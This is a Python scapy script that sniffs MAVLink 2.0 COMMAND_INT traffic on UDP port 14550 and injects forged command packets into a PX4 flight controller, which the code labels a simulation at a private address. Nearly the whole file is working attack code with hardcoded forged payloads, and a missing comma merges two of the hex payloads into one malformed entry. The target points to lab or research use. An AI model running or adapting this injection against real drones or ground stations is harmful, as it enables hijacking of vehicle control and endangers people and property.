from scapy.all import sniff, UDP, Raw
import socket
import time
import random

# ----- Predefined forged COMMAND_INT messages -----
hex_payloads = [
    "fd200000ffffbe4b0000000080bf0000803f000000000000c07f"
    "8d91ab1eac8d72feb0a1ee40 c0000101 cbc2"
    # (1)
    "fd200000c0ffbe4b0000000080bf0000803f000000000000c07f"
    "fcd7ab1e505672fea0163d41 c0000101 720a",
    # (2)
    "fd20000084ffbe4b0000000080bf0000803f000000000000c07f"
    "d485ab1eb4c271fed0113e41 c0000101 fc2d",
    # (3)
    "fd20000032ffbe4b0000000080bf0000803f000000000000c07f"
    "f85eab1e0e9572fee8933d41 c0000101 1b73",
    # (4)
    "fd200000b9ffbe4b0000000080bf0000803f000000000000c07f"
    "3664ab1ef73073fe91f53d41 c0000101 78b4",
    # (5)
    "fd200000c3ffbe4b0000000080bf0000803f000000000000c07f"
    "e4e3ab1e613973feb6713d41c00001015ec0"
]

# Convert to binary list
payloads = [bytes.fromhex(p) for p in hex_payloads]

# PX4 simulation target
target_ip = "192.168.234.129"
target_port = 14550

# Listening interface
interface = "eth0"

# Detect MAVLink2.0 COMMAND_INT (msgid=75)
def is_command_int(pkt):
    if UDP in pkt and Raw in pkt:
        data = pkt[Raw].load
        if len(data) < 10 or data[0] != 0xFD:
            return False
        msgid = int.from_bytes(data[7:10], "little")
        return msgid == 75
    return False

# Send one randomly chosen forged packet
def handle_packet(pkt):
    if is_command_int(pkt):
        forged = random.choice(payloads)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(forged, (target_ip, target_port))
        sock.close()

        print(f"[ATTACK] COMMAND_INT detected. Forged packet sent to PX4 at {target_ip}:{target_port}")
        time.sleep(5)

# Run
print("[INFO] Monitoring started. Ready to intercept.")
while True:
    sniff(
        iface=interface,
        filter="udp port 14550",
        prn=handle_packet,
        stop_filter=is_command_int,
        store=0
    )
